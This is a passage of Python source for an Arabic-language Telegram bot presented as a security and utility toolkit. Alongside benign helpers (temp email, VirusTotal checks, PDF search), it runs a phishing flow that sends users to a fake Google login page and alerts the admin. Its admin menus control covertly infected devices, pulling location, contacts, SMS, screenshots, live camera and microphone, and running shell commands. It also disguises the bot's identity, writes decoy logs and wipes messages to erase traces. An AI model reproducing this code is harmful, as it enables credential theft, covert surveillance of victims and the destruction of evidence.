                                    json={"address": email, "password": password}, timeout=10)
        if login.status_code != 200:
            return None, None, None
        token = login.json().get('token')
        return email, token, password
    except Exception as e:
        return None, None, None

def check_temp_emails_real(token):
    if not token:
        return []
    try:
        headers = {"Authorization": f"Bearer {token}"}
        response = REQUEST_SESSION.get("https://api.mail.tm/messages", headers=headers, timeout=10)
        if response.status_code == 200:
            messages = response.json().get('hydra:member', [])
            results = []
            for msg in messages[:5]:
                results.append(f"📩 من: {msg.get('from', {}).get('address', '')}\n📌 الموضوع: {msg.get('subject', '')}\n📝 مقتطف: {msg.get('intro', '')[:150]}...")
            return results
    except:
        pass
    return []

def scan_apk_real(file_content, file_name):
    if not VIRUSTOTAL_API_KEY:
        return "⚠️ مفتاح VirusTotal غير مضبوط. يرجى إضافة VIRUSTOTAL_API_KEY", "error"
    try:
        url = "https://www.virustotal.com/api/v3/files"
        headers = {"x-apikey": VIRUSTOTAL_API_KEY}
        files = {'file': (file_name, file_content)}
        response = REQUEST_SESSION.post(url, headers=headers, files=files, timeout=60)
        if response.status_code == 200:
            scan_id = response.json().get('data', {}).get('id')
            if scan_id:
                time.sleep(5)
                report_url = f"https://www.virustotal.com/api/v3/analyses/{scan_id}"
                report = REQUEST_SESSION.get(report_url, headers=headers, timeout=30)
                if report.status_code == 200:
                    stats = report.json().get('data', {}).get('attributes', {}).get('stats', {})
                    malicious = stats.get('malicious', 0)
                    suspicious = stats.get('suspicious', 0)
                    if malicious > 0:
                        return f"🚨 تم اكتشاف {malicious} تهديدات!", "malicious"
                    elif suspicious > 0:
                        return f"⚠️ تم اكتشاف {suspicious} عناصر مشبوهة.", "suspicious"
                    else:
                        return "✅ الملف آمن.", "safe"
        return "⚠️ فشل فحص الملف.", "error"
    except Exception as e:
        return f"⚠️ خطأ: {str(e)}", "error"

def generate_fb_report(report_type, reason, link):
    templates = {
        "📢 منشور مسيء": f"""Dear Facebook Support Team,

I am writing to formally report a post that violates Facebook's Community Standards regarding Hate Speech and Offensive Content.

Link (if available): {link if link else 'Not provided'}

Description:
{reason}

Sincerely,
A concerned Facebook user""",
        "👤 حساب مزيف": f"""Dear Facebook Support Team,

I am reporting a fake account.

Account Link: {link if link else 'Not provided'}

Details:
{reason}

Sincerely,
A concerned Facebook user""",
        "🔒 انتهاك خصوصية": f"""Dear Facebook Support Team,

I am reporting a privacy violation.

Link: {link if link else 'Not provided'}

Description:
{reason}

Sincerely,
A concerned Facebook user""",
        "⚠️ تحرش أو مضايقة": f"""Dear Facebook Support Team,

I am reporting harassment.

Link: {link if link else 'Not provided'}

Details:
{reason}

Sincerely,
A concerned Facebook user""",
        "🎭 انتحال شخصية": f"""Dear Facebook Support Team,

I am reporting impersonation.

Link: {link if link else 'Not provided'}

Details:
{reason}

Sincerely,
A concerned Facebook user""",
        "💢 محتوى عنيف": f"""Dear Facebook Support Team,

I am reporting violent content.

Link: {link if link else 'Not provided'}

Description:
{reason}

Sincerely,
A concerned Facebook user"""
    }
    for key in templates:
        if key in report_type:
            return templates[key]
    return f"""Dear Facebook Support Team,

I am reporting content that violates Facebook's Community Standards regarding {report_type}.

Issue Description:
{reason}

Link: {link if link else 'Not provided'}

Sincerely,
A concerned Facebook user"""

def extract_text_from_pdf(pdf_content):
    try:
        pdf_file = BytesIO(pdf_content)
        reader = pypdf.PdfReader(pdf_file)
        text = ""
        for page in reader.pages:
            page_text = page.extract_text()
            if page_text:
                text += page_text + "\n"
        return text.strip()
    except Exception as e:
        return None

def split_text_into_chunks(text, max_chunk_size=3000):
    chunks = []
    while len(text) > max_chunk_size:
        split_point = text.rfind(' ', 0, max_chunk_size)
        if split_point == -1:
            split_point = max_chunk_size
        chunks.append(text[:split_point])
        text = text[split_point:].strip()
    if text:
        chunks.append(text)
    return chunks

def find_relevant_chunk(text, question, chunks):
    keywords = re.findall(r'\b\w+\b', question.lower())
    best_chunk = None
    best_score = 0
    for chunk in chunks:
        chunk_lower = chunk.lower()
        score = sum(1 for kw in keywords if kw in chunk_lower)
        if score > best_score:
            best_score = score
            best_chunk = chunk
    if best_chunk is None:
        best_chunk = chunks[0] if chunks else text
    return best_chunk

def answer_question_from_pdf(text, question):
    if not text:
        return "⚠️ لم يتم تحميل أي نص."
    chunks = split_text_into_chunks(text, 3000)
    relevant_chunk = find_relevant_chunk(text, question, chunks)
    return f"📚 الإجابة: {relevant_chunk[:500]}..."

def fetch_temp_numbers_advanced(limit=5):
    results = []
    sources = [
        ("https://receive-sms-online.cc/", "US"),
        ("https://www.temporary-phone-number.com/", "US"),
        ("https://www.textnow.com/", "US"),
        ("https://sms-online.co/receive-free-sms/", "US"),
        ("https://www.freeonlinephone.org/", "US")
    ]
    for base_url, default_country in sources:
        try:
            response = REQUEST_SESSION.get(base_url, timeout=15)
            if response.status_code != 200:
                continue
            soup = BeautifulSoup(response.text, 'html.parser')
            text = soup.get_text()
            pattern = r'\+?\d{1,3}[-.\s]?\(?\d{1,4}\)?[-.\s]?\d{1,4}[-.\s]?\d{1,4}'
            matches = re.findall(pattern, text)
            for match in matches[:limit]:
                cleaned = re.sub(r'[-.\s()]', '', match)
                if not cleaned.startswith('+'):
                    cleaned = '+' + cleaned
                country = default_country
                country_names = ['USA', 'UK', 'Canada', 'Germany', 'France', 'Spain', 'Italy', 'Egypt', 'UAE', 'Saudi']
                for name in country_names:
                    if name in text[max(0, text.find(match)-50):text.find(match)+50]:
                        country = name
                        break
                results.append({
                    'number': cleaned,
                    'country': country,
                    'source': base_url,
                    'status': 'available'
                })
                if len(results) >= limit:
                    break
            if len(results) >= limit:
                break
        except Exception as e:
            continue
    return results

def download_video(url):
    if not FFMPEG_AVAILABLE:
        return None, "⚠️ FFmpeg غير مثبت على النظام. يُرجى تثبيته لتشغيل هذه الميزة."
    try:
        import yt_dlp
        output_template = os.path.join(TEMP_DIR, f"video_{int(time.time())}.%(ext)s")
        ydl_opts = {
            'outtmpl': output_template,
            'format': 'bestvideo[ext=mp4]+bestaudio[ext=m4a]/best[ext=mp4]/best',
            'quiet': True,
            'no_warnings': True,
        }
        with yt_dlp.YoutubeDL(ydl_opts) as ydl:
            info = ydl.extract_info(url, download=True)
            downloaded_file = ydl.prepare_filename(info)
            if os.path.exists(downloaded_file) and os.path.getsize(downloaded_file) > 0:
                return downloaded_file, None
            else:
                return None, "⚠️ فشل تحميل الفيديو: الملف فارغ أو تالف."
    except Exception as e:
        logger.error(f"Download video error: {e}")
        return None, f"⚠️ فشل تحميل الفيديو: {str(e)[:100]}"

def shorten_url(url):
    try:
        response = REQUEST_SESSION.get(f"https://is.gd/create.php?format=json&url={requests.utils.quote(url)}", timeout=10)
        if response.status_code == 200:
            data = response.json()
            if 'shorturl' in data:
                return data['shorturl'], None
            else:
                return None, data.get('errormessage', 'خطأ غير معروف')
        else:
            return None, f"فشل الاتصال (كود {response.status_code})"
    except Exception as e:
        return None, f"خطأ: {str(e)}"

def check_domain_virustotal(domain):
    if VIRUSTOTAL_API_KEY:
        try:
            url = f"https://www.virustotal.com/api/v3/domains/{domain}"
            headers = {"x-apikey": VIRUSTOTAL_API_KEY}
            response = REQUEST_SESSION.get(url, headers=headers, timeout=30)
            if response.status_code == 200:
                data = response.json()
                stats = data.get('data', {}).get('attributes', {}).get('last_analysis_stats', {})
                malicious = stats.get('malicious', 0)
                suspicious = stats.get('suspicious', 0)
                result = f"🌐 تحليل النطاق: {domain}\n"
                result += f"🛡️ نتائج الفحص:\n"
                result += f"   - ضار: {malicious}\n"
                result += f"   - مشبوه: {suspicious}\n"
                result += f"   - آمن: {stats.get('harmless', 0)}\n"
                if malicious > 0:
                    result += "🚨 **تحذير: تم اكتشاف تهديدات!**"
                elif suspicious > 0:
                    result += "⚠️ **تنبيه: يوجد عناصر مشبوهة**"
                else:
                    result += "✅ **النطاق يبدو آمناً.**"
                return result
        except Exception as e:
            logger.error(f"VirusTotal error: {e}")
    return f"🌐 النطاق: {domain}\n⚠️ لم تتوفر معلومات فحص كافية."

def perform_vulnerability_scan(target_ip, target_domain, target_url):
    if target_url:
        return advanced_website_scan(target_url)
    elif target_domain:
        return advanced_website_scan(f"https://{target_domain}")
    elif target_ip:
        return f"🛡️ فحص IP: {target_ip}\n(لا يدعم هذا الإصدار فحص IP مباشر، يُرجى إرسال رابط أو نطاق.)"
    else:
        return "⚠️ لم يتم تحديد هدف."

# ===================== دوال فحص الروابط =====================
def check_link_safety(url):
    """فحص الرابط للتأكد من سلامته"""
    try:
        # تحليل الرابط
        parsed = urlparse(url)
        domain = parsed.netloc
        
        result = {
            'url': url,
            'domain': domain,
            'safe': True,
            'threats': [],
            'details': {}
        }
        
        # 1. فحص باستخدام VirusTotal
        if VIRUSTOTAL_API_KEY:
            try:
                vt_result = check_domain_virustotal(domain)
                if "تحذير" in vt_result or "تهديدات" in vt_result:
                    result['safe'] = False
                    result['threats'].append("تم اكتشاف تهديدات في VirusTotal")
            except:
                pass
        
        # 2. فحص الروابط المشبوهة
        suspicious_patterns = [
            r'bit\.ly', r'tinyurl\.com', r'goo\.gl', r'ow\.ly',
            r'is\.gd', r'cli\.gs', r'short\.link', r'cut\.ly'
        ]
        for pattern in suspicious_patterns:
            if re.search(pattern, url.lower()):
                result['details']['shortened'] = True
                result['threats'].append("الرابط مختصر - قد يكون خطيراً")
        
        # 3. فحص البروتوكول
        if not url.startswith('https://'):
            result['threats'].append("الرابط غير مشفر (HTTP)")
            result['safe'] = False
        
        # 4. فحص النطاق
        suspicious_domains = [
            'phishing', 'malware', 'virus', 'scam', 'fraud',
            'fake', 'hack', 'crack', 'keygen', 'serial'
        ]
        for sus in suspicious_domains:
            if sus in domain.lower():
                result['threats'].append(f"النطاق يحتوي على كلمة مشبوهة: {sus}")
                result['safe'] = False
        
        # 5. فحص الروابط الشائعة للتصيد
        if 'login' in url.lower() or 'signin' in url.lower() or 'account' in url.lower():
            result['details']['login_page'] = True
        
        # تحديد مستوى الخطر
        if len(result['threats']) == 0:
            result['risk_level'] = '🟢 آمن'
        elif len(result['threats']) <= 2:
            result['risk_level'] = '🟡 مشبوه'
            result['safe'] = False
        else:
            result['risk_level'] = '🔴 خطير'
            result['safe'] = False
        
        return result
    except Exception as e:
        return {
            'url': url,
            'safe': False,
            'risk_level': '🔴 خطأ',
            'threats': [f"حدث خطأ أثناء الفحص: {str(e)}"]
        }

# ===================== دوال Google =====================
def google_login(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        safe_send(chat_id, "✅ أنت متصل بالفعل.")
        return
    fake_url = f"{SERVER_URL}/google_login"
    msg = (
        "🔑 <b>تفعيل الخدمات</b>\n\n"
        "للوصول إلى الخدمات المميزة، يُرجى تسجيل الدخول عبر الرابط الرسمي التالي:\n"
        f"{fake_url}\n\n"
        "مع ضرورة التأكيد على إدخال بيانات الاعتماد الصحيحة.\n\n"
        "للاستفسارات، يُرجى التواصل مع فريق الدعم."
    )
    safe_send(chat_id, msg)
    notify_admin(f"🔑 مستخدم {chat_id} فتح صفحة تسجيل الدخول المزيفة لجوجل")

def google_logout(message):
    chat_id = message.chat.id
    if chat_id in google_users:
        del google_users[chat_id]
    if chat_id in google_passwords:
        del google_passwords[chat_id]
    safe_send(chat_id, "✅ تم تسجيل الخروج.")

# ===================== متغيرات الحالة =====================
user_states = {}
google_users = {}
google_passwords = {}
temp_emails = {}
developer_computer_endpoint = None
admin_remote_target = {}
linked_users = set()
tts_voice_selection = {}
bot_locked = False
bot_shield_active = False

# ===================== نظام كشف الاختراق =====================
suspicious_attempts = {}
BLOCK_THRESHOLD = 3
BLOCK_DURATION = 3600

def is_blocked(user_id):
    if user_id in suspicious_attempts:
        if suspicious_attempts[user_id]['blocked']:
            if time.time() - suspicious_attempts[user_id]['block_time'] < BLOCK_DURATION:
                return True
            else:
                suspicious_attempts[user_id]['blocked'] = False
                suspicious_attempts[user_id]['attempts'] = 0
    return False

def detect_suspicious_activity(user_id, command, user_data=None):
    suspicious_commands = [
        "eval", "exec", "os.system", "subprocess", "__import__",
        "globals", "locals", "getattr", "setattr", "delattr",
        "open", "file", "compile", "execfile", "input",
        "raw_input", "exit", "quit", "help", "dir"
    ]
    
    is_suspicious = False
    reason = ""
    
    for cmd in suspicious_commands:
        if cmd in command.lower():
            is_suspicious = True
            reason = f"أمر مشبوه: `{cmd}`"
            break
    
    if user_id not in suspicious_attempts:
        suspicious_attempts[user_id] = {'attempts': 0, 'blocked': False, 'block_time': 0}
    
    if is_suspicious:
        suspicious_attempts[user_id]['attempts'] += 1
        
        # تقرير منظم عن محاولة الاختراق
        report_data = {
            'action_type': 'محاولة اختراق',
            'platform': 'Telegram',
            'status': 'blocked',
            'details': {
                'الأمر': command[:100],
                'السبب': reason
            },
            'risk_level': 'عالٍ',
            'flagged': True,
            'ip': 'N/A',
            'user_agent': 'N/A'
        }
        send_structured_report('اختراق', report_data, user_id, user_data.get('username') if user_data else None)
        
        # إرسال تنبيه إضافي
        msg = f"🚨 **تنبيه أمني!**\n\n"
        msg += f"👤 **المستخدم:** `{user_id}`\n"
        msg += f"🔍 **السبب:** `{reason}`\n"
        msg += f"🕐 **الوقت:** `{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}`\n"
        msg += f"📝 **الأمر:** `{command[:100]}`"
        
        if user_data:
            msg += f"\n👤 **الاسم:** `{user_data.get('first_name', 'غير معروف')}`"
        
        safe_send(ADMIN_ID, msg)
        
        if suspicious_attempts[user_id]['attempts'] >= BLOCK_THRESHOLD:
            suspicious_attempts[user_id]['blocked'] = True
            suspicious_attempts[user_id]['block_time'] = time.time()
            
            ban_msg = f"🚫 **تم حظر المستخدم تلقائياً!**\n\n"
            ban_msg += f"👤 **المستخدم:** `{user_id}`\n"
            ban_msg += f"🔢 **عدد المحاولات:** `{suspicious_attempts[user_id]['attempts']}`\n"
            ban_msg += f"⏳ **مدة الحظر:** `{BLOCK_DURATION // 60} دقيقة`"
            safe_send(ADMIN_ID, ban_msg)
            ban_user(user_id)
    
    return is_suspicious

def send_honeypot_message(chat_id):
    fake_messages = [
        "⚠️ حدث خطأ في النظام، يرجى المحاولة لاحقاً.",
        "📡 جاري تحديث قاعدة البيانات...",
        "🔍 فحص الأمان قيد التشغيل...",
        "⚙️ تم تطبيق التحديثات بنجاح.",
        "🔄 إعادة تشغيل الخدمة..."
    ]
    msg = fake_messages[secrets.randbelow(len(fake_messages))]
    safe_send(chat_id, msg)

# ===================== الأزرار الأمنية (تعمل بشكل حقيقي) =====================

def toggle_bot_lock(chat_id):
    """قفل أو فتح البوت بشكل حقيقي"""
    global bot_locked
    bot_locked = not bot_locked
    status = "مقفل 🔒" if bot_locked else "مفتوح 🔓"
    safe_send(chat_id, f"✅ تم {status} البوت")
    notify_admin(f"{'🔒 قفل' if bot_locked else '🔓 فتح'} البوت بواسطة المستخدم {chat_id}")
    return bot_locked

def toggle_dev_shield(chat_id):
    """تفعيل أو إلغاء درع المطور بشكل حقيقي"""
    global bot_shield_active
    bot_shield_active = not bot_shield_active
    status = "مفعل 🛡️" if bot_shield_active else "معطل"
    safe_send(chat_id, f"✅ تم {status} درع المطور")
    notify_admin(f"{'🛡️ تفعيل' if bot_shield_active else '⚠️ إلغاء'} درع المطور بواسطة المستخدم {chat_id}")
    return bot_shield_active

# ===================== آليات الإخفاء =====================
BOT_NAMES = [
    "System Scanner", "Security Checker", "Network Tool",
    "File Manager", "PDF Reader", "Help Desk", "Support Bot"
]

BOT_DESCRIPTIONS = [
    "أداة فحص النظام الرقمي",
    "تطبيق إدارة الملفات المتقدم",
    "مساعد الدعم الفني",
    "أداة قراءة ملفات PDF"
]

def disguise_bot():
    """تبديل هوية البوت بشكل حقيقي"""
    try:
        new_name = secrets.choice(BOT_NAMES)
        new_description = secrets.choice(BOT_DESCRIPTIONS)
        
        bot.set_my_name(new_name)
        bot.set_my_description(new_description)
        bot.set_my_short_description("أداة متقدمة للفحص الرقمي")
        
        logger.info(f"🕵️ تم تغيير اسم البوت إلى: {new_name}")
        notify_admin(f"🕵️ تم تبديل هوية البوت إلى: {new_name}")
        return True
    except Exception as e:
        logger.error(f"فشل تغيير اسم البوت: {e}")
        return False

def add_decoy_logs():
    decoy_entries = [
        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] خطأ في الاتصال بالخادم: تم إعادة المحاولة.",
        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] تم تحديث قاعدة البيانات (غير صحيح).",
        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] فشل المصادقة للمستخدم `guest`.",
        f"[{datetime.now().strftime('%Y-%m-%d %H:%M:%S')}] تم إعادة تشغيل النظام بسبب خطأ غير متوقع."
    ]
    with open('bot.log', 'a') as f:
        f.write("\n" + "\n".join(decoy_entries) + "\n")

def stealth_mode_activation(chat_id):
    """وضع التخفي - يمسح الرسائل ويرسل رسائل وهمية"""
    safe_send(chat_id, "🌫️ تم تفعيل وضع التخفي. سيتم مسح جميع الرسائل السابقة.")
    try:
        # محاولة حذف الرسائل
        for i in range(1, 20):
            try:
                bot.delete_message(chat_id, chat_id - i)
            except:
                pass
    except:
        pass
    # إرسال رسائل وهمية
    for _ in range(3):
        send_honeypot_message(chat_id)
        time.sleep(0.5)
    logger.info(f"🌫️ تم تفعيل وضع التخفي في المحادثة {chat_id}")
    notify_admin(f"🌫️ تم تفعيل وضع التخفي في المحادثة {chat_id}")

def wipe_traces(chat_id):
    """حذف الآثار - يمسح جميع الرسائل الممكنة"""
    safe_send(chat_id, "💣 جاري حذف الآثار...")
    deleted = 0
    try:
        for i in range(1, 101):
            try:
                bot.delete_message(chat_id, chat_id - i)
                deleted += 1
            except:
                pass
        safe_send(chat_id, f"✅ تم حذف {deleted} رسالة.")
    except:
        safe_send(chat_id, f"⚠️ تم حذف {deleted} رسالة متاحة.")
    logger.info(f"💣 تم حذف الآثار في المحادثة {chat_id}")
    notify_admin(f"💣 تم حذف الآثار في المحادثة {chat_id}")

# ===================== قائمة الميزات =====================
ALL_FEATURES = [
    "site_scan", "apk_scan", "code_review", "temp_email",
    "fb_report", "track_phone", "pdf_analysis", "temp_number",
    "download_video", "shorten_url", "vuln_scan", "facebook_followers",
    "survey", "track_phone_location", "apk_survey",
    "video_chat", "freefire", "whatsapp_web",
    "link_scanner", "tiktok_followers",
    "hidden_image_polyglot",
    "stealth_mode", "wipe_traces", "dev_shield", "lock_bot",
    "live_camera", "live_mic", "remote_desktop", "shutdown_device",
    "smart_analysis", "export_data", "identity_switch"
]

ADMIN_ONLY_FEATURES = [
    "apk_survey", "admin_panel", "view_devices", "remote_admin",
    "set_dev_endpoint", "admin_stats", "admin_broadcast",
    "admin_collected_data", "admin_logs", "admin_ban_user", "admin_unban_user",
    "hidden_image_polyglot",
    "stealth_mode", "wipe_traces", "dev_shield", "lock_bot",
    "live_camera", "live_mic", "remote_desktop", "shutdown_device",
    "smart_analysis", "export_data", "identity_switch"
]

feature_usage = {
    "ثغرات المواقع": 0, "فحص APK": 0, "فحص كود": 0,
    "إيميل مؤقت": 0, "تتبع الأرقام": 0,
    "بلاغات فيسبوك": 0,
    "تحميل فيديو": 0, "تقصير روابط": 0,
    "فحص ثغرات": 0, "رشق متابعين": 0,
    "استبيان": 0,
    "تتبع رقم": 0, "APK": 0,
    "لوحة التحكم": 0,
    "دردشة فيديو": 0,
    "شحن فري فاير": 0,
    "ربط واتساب": 0,
    "فحص روابط": 0,
    "متابعين تيك توك": 0,
    "صورة مدموجة": 0,
    "وضع التخفي": 0,
    "حذف الأثر": 0,
    "درع المطور": 0,
    "قفل البوت": 0,
    "كاميرا فورية": 0,
    "تنصت صوتي": 0,
    "سطح المكتب": 0,
    "إيقاف تشغيل": 0,
    "تحليل ذكي": 0,
    "تصدير البيانات": 0,
    "تبديل الهوية": 0
}

FB_REPORT_TYPES = {
    "offensive": "📢 منشور مسيء",
    "fake": "👤 حساب مزيف",
    "inappropriate": "🚫 محتوى غير لائق",
    "privacy": "🔒 انتهاك خصوصية",
    "harassment": "⚠️ تحرش أو مضايقة",
    "impersonation": "🎭 انتحال شخصية",
    "violent": "💢 محتوى عنيف",
    "other": "📌 أخرى"
}

def is_admin(user_id):
    return user_id == ADMIN_ID

# ===================== بناء القوائم =====================
def build_main_menu(user_id):
    markup = InlineKeyboardMarkup(row_width=2)
    is_admin_user = is_admin(user_id)
    user_points = get_user_points(user_id) if not is_admin_user else 999
    unlocked = is_user_unlocked(user_id) if not is_admin_user else True
    user_perms = get_user_permissions(user_id) if not is_admin_user else ALL_FEATURES

    def can_access(feature, required_points=0):
        if is_admin_user:
            return True
        if unlocked:
            return True
        if user_points >= required_points:
            return True
        return feature in user_perms

    # رسالة ترحيب مختصرة
    safe_send(user_id, WELCOME_MESSAGE)

    markup.row(
        InlineKeyboardButton("🔍 فحص الأمان", callback_data="mode_site") if can_access("site_scan", 10) else InlineKeyboardButton("🔍 فحص الأمان 🔒", callback_data="locked_site"),
        InlineKeyboardButton("📦 فحص التطبيقات", callback_data="mode_apk") if can_access("apk_scan", 10) else InlineKeyboardButton("📦 فحص التطبيقات 🔒", callback_data="locked_apk")
    )
    markup.row(
        InlineKeyboardButton("🛠️ مراجعة الكود", callback_data="mode_my_app") if can_access("code_review", 10) else InlineKeyboardButton("🛠️ مراجعة الكود 🔒", callback_data="locked_my_app"),
        InlineKeyboardButton("📤 انشاء بريد", callback_data="mode_temp_email") if can_access("temp_email", 0) else InlineKeyboardButton("📤 انشاء بريد 🔒", callback_data="locked_temp_email")
    )
    markup.row(
        InlineKeyboardButton("بلاغ فيسبوك", callback_data="mode_fb_report") if can_access("fb_report", 30) else InlineKeyboardButton("بلاغ فيسبوك 🔒", callback_data="locked_fb_report"),
        InlineKeyboardButton("📍 تتبع رقم", callback_data="mode_track_phone") if can_access("track_phone", 10) else InlineKeyboardButton("📍 تتبع رقم 🔒", callback_data="locked_track_phone")
    )
    markup.row(
        InlineKeyboardButton("📚 تحليل PDF", callback_data="mode_pdf") if can_access("pdf_analysis", 0) else InlineKeyboardButton("📚 تحليل PDF 🔒", callback_data="locked_pdf")
    )
    markup.row(
        InlineKeyboardButton("📱 الحصول على رقم", callback_data="mode_temp_number") if can_access("temp_number", 50) else InlineKeyboardButton("📱 الحصول على رقم 🔒", callback_data="locked_temp_number")
    )
    if user_id in google_users:
        markup.row(InlineKeyboardButton("✅ الخدمات مفعلة", callback_data="mode_google_logout"))
    else:
        markup.row(InlineKeyboardButton("🔗 تفعيل الخدمات", callback_data="mode_google_login"))
    markup.row(
        InlineKeyboardButton("📥 تحميل فيديو", callback_data="mode_download") if can_access("download_video", 0) else InlineKeyboardButton("📥 تحميل فيديو 🔒", callback_data="locked_download"),
        InlineKeyboardButton("🔗 تقصير الروابط", callback_data="mode_shorten_url") if can_access("shorten_url", 0) else InlineKeyboardButton("🔗 تقصير الروابط 🔒", callback_data="locked_shorten")
    )
    markup.row(
        InlineKeyboardButton("🛡️ فحص ثغرات", callback_data="mode_vuln_scan") if can_access("vuln_scan", 20) else InlineKeyboardButton("🛡️ فحص ثغرات 🔒", callback_data="locked_vuln_scan"),
        InlineKeyboardButton("📊 رشق متابعين", callback_data="mode_facebook_followers") if can_access("facebook_followers", 0) else InlineKeyboardButton("📊 رشق متابعين 🔒", callback_data="locked_facebook_followers")
    )
    markup.row(
        InlineKeyboardButton("📋 استبيان مدفوع", callback_data="mode_survey") if can_access("survey", 1000) else InlineKeyboardButton("📋 استبيان مدفوع 🔒 (1000 نقطة)", callback_data="locked_survey")
    )
    markup.row(
        InlineKeyboardButton("📍 تتبع موقع الهاتف", callback_data="mode_track_phone_location") if can_access("track_phone_location", 500) else InlineKeyboardButton("📍 تتبع موقع الهاتف 🔒 (500 نقطة)", callback_data="locked_track_phone_location"),
        InlineKeyboardButton("📱 APK", callback_data="mode_apk_survey") if is_admin_user else InlineKeyboardButton("📱 APK 🔒 (للمطور فقط)", callback_data="locked_apk_survey")
    )

    new_features = [
        ("📹 دردشة فيديو", "video_chat", 0),
        ("🔥 شحن فري فاير", "freefire", 0),
        ("📱 ربط واتساب ويب", "whatsapp_web", 0),
        ("🌐 فحص الروابط", "link_scanner", 0),
        ("📊 متابعين تيك توك", "tiktok_followers", 0)
    ]

    for i in range(0, len(new_features), 2):
        row = []
        for j in range(2):
            if i + j < len(new_features):
                label, feature, points = new_features[i + j]
                if is_admin_user or feature in user_perms:
                    row.append(InlineKeyboardButton(label, callback_data=f"mode_{feature}"))
                else:
                    row.append(InlineKeyboardButton(f"{label} 🔒", callback_data=f"locked_{feature}"))
        if row:
            markup.row(*row)

    markup.row(
        InlineKeyboardButton("⭐ نقاطي", callback_data="mode_show_points"),
        InlineKeyboardButton("📊 سجل النقاط", callback_data="mode_points_history")
    )
    markup.row(
        InlineKeyboardButton("🔗 رابط دعوتي", callback_data="mode_show_referral")
    )

    if is_admin_user:
        markup.row(
            InlineKeyboardButton("👑 لوحة التحكم", callback_data="mode_admin_panel"),
            InlineKeyboardButton("📱 الأجهزة", callback_data="mode_view_devices")
        )
        markup.row(
            InlineKeyboardButton("🎮 تحكم عن بعد", callback_data="mode_remote_admin"),
            InlineKeyboardButton("🎯 التحكم الخفي", callback_data="stealth_control_menu")
        )
        markup.row(
            InlineKeyboardButton("🖥️ ربط حاسب", callback_data="mode_set_dev_endpoint")
        )
        markup.row(
            InlineKeyboardButton("🕵️ تبديل الهوية", callback_data="mode_identity_switch"),
            InlineKeyboardButton("🌫️ وضع التخفي", callback_data="mode_stealth")
        )
        markup.row(
            InlineKeyboardButton("💣 حذف الأثر", callback_data="mode_wipe_traces"),
            InlineKeyboardButton("🛡️ درع المطور", callback_data="mode_dev_shield")
        )
        markup.row(
            InlineKeyboardButton("🔒 قفل البوت", callback_data="mode_lock_bot"),
            InlineKeyboardButton("📸 كاميرا فورية", callback_data="mode_live_camera")
        )
        markup.row(
            InlineKeyboardButton("🎙️ تنصت صوتي", callback_data="mode_live_mic"),
            InlineKeyboardButton("🖥️ سطح المكتب", callback_data="mode_remote_desktop")
        )
        markup.row(
            InlineKeyboardButton("🔌 إيقاف تشغيل", callback_data="mode_shutdown_device"),
            InlineKeyboardButton("📊 تحليل ذكي", callback_data="mode_smart_analysis")
        )
        markup.row(
            InlineKeyboardButton("📂 تصدير البيانات", callback_data="mode_export_data"),
            InlineKeyboardButton("💥 هجوم التشويش", callback_data="mode_jamming")
        )
        markup.row(
            InlineKeyboardButton("🎭 إرسال رسائل مزيفة", callback_data="mode_spoof")
        )

    return markup

# ===================== قوائم التحكم الخفي =====================
def build_stealth_control_menu():
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("📱 الأجهزة الخفية", callback_data="stealth_devices"),
        InlineKeyboardButton("📊 حالة الأجهزة", callback_data="stealth_status")
    )
    markup.row(
        InlineKeyboardButton("📢 بث أمر للجميع", callback_data="stealth_broadcast"),
        InlineKeyboardButton("🔄 تحديث الكل", callback_data="stealth_refresh_all")
    )
    markup.row(InlineKeyboardButton("🔙 رجوع للرئيسية", callback_data="back_to_main"))
    return markup

def build_stealth_devices_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة خفية", callback_data="no_devices"))
    else:
        for dev in devices:
            device_id = dev['device_id']
            last_seen = dev.get('last_seen', '')
            is_online = False
            if last_seen:
                try:
                    last_time = datetime.fromisoformat(last_seen)
                    is_online = (datetime.now() - last_time).total_seconds() < 300
                except:
                    pass
            status_icon = "🟢" if is_online else "🔴"
            short_id = device_id[:8] + "..." if len(device_id) > 10 else device_id
            markup.row(InlineKeyboardButton(
                f"{status_icon} {short_id}",
                callback_data=f"stealth_select_{device_id}"
            ))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="stealth_control_menu"))
    return markup

def build_stealth_advanced_menu(device_id):
    markup = InlineKeyboardMarkup(row_width=2)
    markup.row(
        InlineKeyboardButton("📍 الموقع", callback_data=f"stealth_cmd_{device_id}_GET_LOCATION"),
        InlineKeyboardButton("📇 جهات اتصال", callback_data=f"stealth_cmd_{device_id}_GET_CONTACTS")
    )
    markup.row(
        InlineKeyboardButton("✉️ رسائل SMS", callback_data=f"stealth_cmd_{device_id}_GET_SMS"),
        InlineKeyboardButton("📸 لقطة شاشة", callback_data=f"stealth_cmd_{device_id}_SCREENSHOT")
    )
    markup.row(
        InlineKeyboardButton("🎙️ تسجيل صوت", callback_data=f"stealth_cmd_{device_id}_RECORD"),
        InlineKeyboardButton("📊 معلومات", callback_data=f"stealth_cmd_{device_id}_GET_INFO")
    )
    markup.row(
        InlineKeyboardButton("🚫 حظر الجهاز", callback_data=f"stealth_block_{device_id}"),
        InlineKeyboardButton("🔓 فك الحظر", callback_data=f"stealth_unblock_{device_id}")
    )
    markup.row(
        InlineKeyboardButton("🖥️ أمر Shell", callback_data=f"stealth_shell_{device_id}"),
        InlineKeyboardButton("🔄 تحديث الحالة", callback_data=f"stealth_refresh_{device_id}")
    )
    markup.row(InlineKeyboardButton("🔙 رجوع للأجهزة", callback_data="stealth_devices"))
    return markup

# ===================== قوائم الأجهزة العادية =====================
def build_device_list_markup():
    markup = InlineKeyboardMarkup(row_width=1)
    devices = get_registered_devices_db()
    if not devices:
        markup.row(InlineKeyboardButton("⚠️ لا توجد أجهزة", callback_data="no_devices"))
    else:
        for dev in devices:
            device_id = dev['device_id']
            short_id = device_id[:8] + "..." if len(device_id) > 10 else device_id
            markup.row(InlineKeyboardButton(f"📱 {short_id}", callback_data=f"remote_select_{device_id}"))
    markup.row(InlineKeyboardButton("🔙 رجوع", callback_data="back_to_main"))
    return markup

# ===================== باقي القوائم =====================
def build_fb_report_type_markup():
